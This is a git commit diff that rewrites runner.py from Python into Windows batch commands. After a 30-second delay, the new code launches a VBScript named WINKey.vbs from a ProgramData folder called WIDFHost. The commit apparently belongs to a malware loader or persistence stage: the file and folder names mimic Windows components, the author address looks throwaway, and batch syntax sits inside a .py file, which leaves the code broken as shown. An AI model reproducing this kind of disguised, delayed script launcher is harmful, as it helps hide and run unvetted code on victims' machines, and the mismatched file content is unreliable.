9ec080ba510c024af683c83aa09a6905f3861e2c
gitlab124 <dsf78er2xder512325er@tutamail.com>
2024-10-27 18:34:29 +0100

    runner.py

--- runner.py
+++ runner.py
@@ -1,11 +1,10 @@
-import os
-import subprocess
+@echo off
+set chemin_executable=%ProgramData%\WIDFHost\WINKey.vbs
 
-chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WINKey.vbs')
+timeout /t 30
 
-#time.sleep(5)
-
-if os.path.isfile(chemin_executable):
-    subprocess.run(['cscript.exe', chemin_executable])
-else:
-    print("...")
+if exist "%chemin_executable%" (
+    cscript "%chemin_executable%"
+) else (
+    echo Le script WINKey.vbs est introuvable dans le dossier WIDFHost de ProgramData.
+)
